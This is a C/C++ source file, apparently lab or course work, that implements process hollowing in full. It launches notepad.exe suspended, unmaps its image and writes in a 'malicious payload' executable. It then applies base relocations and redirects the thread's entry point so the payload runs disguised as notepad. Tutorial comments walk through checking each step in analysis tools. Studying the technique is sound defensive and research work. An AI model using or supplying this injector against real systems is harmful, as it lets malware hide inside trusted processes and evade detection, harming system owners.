#include <windows.h>
#include <stdio.h>
#include "hollo.h"


// This relocation occurs after copying all of the malicious payload into the base address image of the target process.
// Why we do it cuz we have modified the image base of the malicious payload. However, other hardcoded addresses in the malicious payload are in reference to the original base address of the malicious payload.
// These addresses need to be re-computed with the new base address and thus is the need for relocation.
// Naviage to CFF explorer -> Relocation Directory, 
void FixRelocation(HANDLE tpHandle, LPVOID payloadBytesBuffer, PIMAGE_NT_HEADERS payloadNTHeaders, PIMAGE_SECTION_HEADER payloadImageSection, LPVOID targetImageBase, DWORD deltaBase) {
    IMAGE_DATA_DIRECTORY relocTable = (IMAGE_DATA_DIRECTORY)payloadNTHeaders->OptionalHeader.DataDirectory[5]; // In CFF explorer, it is visible under 'optional header -> Data Directories [x] ->  Relocation Directory and Size'
    // also visible under section headers [x] , entry '.reloc'.
    for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++) {
        BYTE* sectionName = (BYTE*)".reloc";
        if (memcmp(&payloadImageSection->Name, sectionName, 5) != 0) {
            payloadImageSection++;
            continue;
        }

        // being here means we are at the .reloc section
        DWORD payloadRawData = payloadImageSection->PointerToRawData; // PointerToRawData is reflected in CFF explorer as  'Raw Address' under 'Section Headers[x]'.
        DWORD relocOffset = 0;
        DWORD bytesRead = 0;
        SIZE_T* pBytesRead = 0;

        while (relocOffset < relocTable.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);
            // The 'relocationBlock' above contains entry of the columns 'RVA' and 'Size of Block' of the 'Relocation Directory'.
            relocOffset += sizeof(BASE_RELOCATION_BLOCK);
            /*
            To get the number of entries in a 'Relocation Directory' entry, we subtracts the block size of the relocation block with the size of the BASE_RELOCATION_BLOCK (size = 8)
            Then, the result is divided by the size of of the BASE_RELOCATION_ENTRY (size = 2).
            */
            DWORD relocEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY); // this value is hex in the code but in CFF explorer, it is decimal so compare with calcualtor for valdation.
            PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);
            // in 'relocEntries', the type is 3 for x86 (32-bit system).

            for (DWORD x = 0; x < relocEntryCount; x++) {
                relocOffset += sizeof(BASE_RELOCATION_ENTRY);
                if (relocEntries[x].Type == 0) {
                    continue;
                }
                DWORD relocationRVA = relocationBlock->PageAddress + relocEntries[x].Offset; // this value 'relocationRVA' contains the hardcoded addresses that are set as per the original image base. These would need to be overwritten.
                // It is best to follow the above value using PEBear tool, click the tab 'BaseReloc', then, 'right click -> follow RVA'.
                DWORD addressToPatch = 0;
                ReadProcessMemory(tpHandle, (LPCVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), &bytesRead); // This call extracts the address value from the relocationRVA to addressToPatch variable.
                addressToPatch += deltaBase;    // Delta is added to account for the new offset where the malicious payload has been relocated inside the hollowed target process.
                WriteProcessMemory(tpHandle, (PVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), &bytesRead); // fix those addresses.
            }
        }
    }
}

int main() {
    printf("[+] Starting process hollowing demo\n");

    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        printf("[-] Failed to load NtQueryInformationProcess \n");
        exit(-1);
    }

    // Creating a process in suspended state
    LPSTARTUPINFOA startInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* procBasicInfo = new PROCESS_BASIC_INFORMATION();
    HANDLE hPayload = NULL;
    DWORD payloadFileSize = 0;

    printf("[+] Opening 32-bit notepad process in suspended mode \n");
    LPSTR procName = (LPSTR)"C:\\windows\\syswow64\\notepad.exe";
    if (!CreateProcessA(NULL, procName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
        perror("[-] Error creating the process in suspended state \n");
        exit(-1);
    }
    // At this point, use 'system informer' tool, search for the 32-bit notepad.exe process
    // Under the threads tab, add column 'state' and you should see the thread in the 'Wait:Suspended' state. 
    // This confirms that the process has been created in a suspended state to prepare it for process hollowing.
    // NOTE: this is the target address that we want to hollow out during process hollowing.
    printf("[+] Process created in suspended state\n");

    // Getting target process handle
    HANDLE tpHandle = procInfo->hProcess;
    DWORD retLen = 0;
    // Getting target base offset address
    pNtQueryInformationProcess(tpHandle, ProcessBasicInformation, procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
    /*
        Have a look at the PebBaseAddress in 'System Informer' under the 'Memory' tab.
        Expand that section which contains the address range and browse to that memory section.
        Now, if you add 8 bytes more to the location, you will reach a memory address pattern, which contains the address of the base of the image of the PEB.
        This base 'image' address is visible from the 'Memory' tab of the process.
        This is why 8 is added in the code line below to extract the base address of the PEB.
        Ref: https://www.vergiliusproject.com/kernels/x86/Windows%2010/2210%2022H2%20(May%202023%20Update)/_PEB , shows that image base address is located at 0x8 offset.
    */
    DWORD pebImageBaseOffset = (DWORD)procBasicInfo->PebBaseAddress + 8;
    printf("[+] Target process base image offset is: %p\n", pebImageBaseOffset);
    // Getting target image base address
    LPVOID targetImageBase = 0;
    SIZE_T bytesRead = 0;

    /*
        After a successful execution of the ReadProcessMemory API, the 'targetImageBase' should contain
        the value of (not pointer) of the base address of the PE image which has to be hollowed out.
        As usual, verify it from system informer's 'Memory' tab.
    */
    if (!ReadProcessMemory(tpHandle, (LPCVOID)pebImageBaseOffset, &targetImageBase, 4, &bytesRead)) {
        int lastError = GetLastError();
        perror("[-] Error reading the target image base address \n");
        exit(-1);
    }
    printf("[+] Target process image base address: %p\n", targetImageBase);

    // Getting handle to the malicious payload
    hPayload = CreateFileA("C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessHollowing\\Payload32\\payload32.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        perror("[-] Error opening handle to the payload\n");
        exit(-1);
    }
    payloadFileSize = GetFileSize(hPayload, NULL);
    // writing malicious payload to the memory
    LPVOID payloadBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadFileSize);
    printf("[+] Allocated memory for payload in current process : %p \n", payloadBytesBuffer);
    ReadFile(hPayload, payloadBytesBuffer, payloadFileSize, &bytesRead, NULL);

    // Parsing the PE and get image size
    /*
        Recommend to make a copy of the payload you are injecting and open it in CFF explorer.
        CFF explorer allows for header values to be visually parsed while verifying 
        if the correct values have been extracted in the program during the debug.
    */
    PIMAGE_DOS_HEADER payloadDOSHeader = (PIMAGE_DOS_HEADER)payloadBytesBuffer;
    PIMAGE_NT_HEADERS payloadNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)payloadBytesBuffer + payloadDOSHeader->e_lfanew);
    SIZE_T imageSize = (DWORD)payloadNTHeaders->OptionalHeader.SizeOfImage;

    // Hollowing the target process
    _ZwUnmapViewOfSection pZwUnmapViewOfSection = (_ZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
    if (pZwUnmapViewOfSection == NULL) {
        printf("[-] Failed to load ZwUnmapViewOfSection \n");
        exit(-1);
    }
    /*
        Over to the 'System Informer' tool, if you go to the memory tab and read the image base address memory location, 
        you'd see that after unmapping this is no longer viewable and accessible as expected.
    */
    pZwUnmapViewOfSection(tpHandle, targetImageBase);
    printf("[+] Successfully unmapped view of section\n");

    // Allocate new memory in the target process
    // The memory is allocated at the previously calculated address of the image base address.
    LPVOID newTargetImageBase = VirtualAllocEx(tpHandle, targetImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // At this point, refresing the memory tab of the process in 'System Imformer' will reveal the image base address again.
    // Exploring that address in more detail, we see its all zeroes as expected.
    targetImageBase = newTargetImageBase;
    printf("[+] Target process new image base: %p \n", targetImageBase);
    // Delta between image base address and remote process base address.
    // This delta is used for process relocation calculation. As we'd see later in the FixRelocation function, 
    // this delta is added to various hardcoded address entries of the mapped malicious PE payload such that it is execulable post relocation after hollow-filling.
    DWORD deltaBase = (DWORD)targetImageBase - payloadNTHeaders->OptionalHeader.ImageBase; // this is used in the relocations
    
    // Setting the source image base to the target image base and copying the payload image headers to the target image address.
    payloadNTHeaders->OptionalHeader.ImageBase = (DWORD)targetImageBase;
    // After the execution of the below API call, if you refresh memory page of the base address of the target process in the 'System Informer', 
    // you'd see that instead of all zeroes, it now contains the PE headers.
    WriteProcessMemory(tpHandle, targetImageBase, payloadBytesBuffer, payloadNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Next, we will copy all sections of the malicious payload to the target process.
    // These sections are also vieweable as dowpdown in the 'Memory' section of the 'System Informer' of type 'Image'.
    // We can expore the section header also by use of the CFF explorer on the malicious payload (i.e. is .text, .reloc, .data, etc).
    PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER)((DWORD)payloadBytesBuffer +
        payloadDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    // We are saving payloadImageSection in 'oldImageSection' because in the for loop below, we'd be incrementing it and we want to save the original value.
    PIMAGE_SECTION_HEADER oldImageSection = payloadImageSection;

    for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++) { // we can verify the number of sections to be copied from the CFF explorer as well as the 'System Informer'.
        PVOID targetSectionLocation = (PVOID)((DWORD)targetImageBase + payloadImageSection->VirtualAddress); // this value is available under CFF explorer 'Section Headers [x]' for each parsed section.
        PVOID payloadSectionLocation = (PVOID)((DWORD)payloadBytesBuffer + payloadImageSection->PointerToRawData);
        // You can keep refreshing the memory location observed in the 'System Informer' to see how each section 
        // of the malicious payload at each loop iteration is written to the memory of the target process.
        WriteProcessMemory(tpHandle, targetSectionLocation, payloadSectionLocation, payloadImageSection->SizeOfRawData, NULL);
        payloadImageSection++;
    }

    payloadImageSection = oldImageSection;

    // core of preocess hollowing - relocation, aka patching of fixed or hardcoded addresses inside malicious payload
    FixRelocation(tpHandle, payloadBytesBuffer, payloadNTHeaders, payloadImageSection, targetImageBase, deltaBase);

    // fix entry point to point to the start of malicious hollowed payload, cuz we want to execute the malicious hollowed payload.
    DWORD entryPoint = (DWORD)targetImageBase + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint; // these NT header values are explorable from CFF header.
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    printf("[+] Getting thread context... \n");
    if (!GetThreadContext(procInfo->hThread, pContext)) {
        perror("[-] Error getting thread context ...\n");
        exit(-1);
    }
    printf("[+] Setting thread context\n");
    // change of control flow at entry point
    // In x86, EAX holds the address of the entry point.
    // This can be checked by x64dbg tool that EAX has notedpad.exe as entry point but we have replaced it with our malicious payload.
    // Maybe enable debugging by https://github.com/Mattiwatti/PPLKiller(?)
    pContext->Eax = entryPoint;
    //
    if (!SetThreadContext(procInfo->hThread, pContext)) {
        perror("[+] Error setting thread context\n");
        exit(-1);
    }
    printf("[+] Resuming thread\n");
    ResumeThread(procInfo->hThread);
}